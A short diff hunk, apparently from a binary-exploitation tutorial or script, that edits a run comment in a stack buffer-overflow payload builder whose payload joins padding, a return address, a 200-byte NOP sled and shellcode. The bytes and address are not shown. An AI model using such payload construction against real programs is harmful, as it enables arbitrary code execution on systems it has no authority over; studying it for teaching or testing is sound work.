@@ -332,7 +332,7 @@ nops = "\x90" * 200
 # Structure: [PADDING] + [JUMP ADDRESS] + [NOPs] + [SHELLCODE]
 payload = "A" * padding_size + return_addr + nops + shellcode
 
-# Run : ./<file> "$(python3 binary_exploitation.py)"
+# Run : ./<file> "$(python binary_exploitation.py)"
 print payload
 ```
 
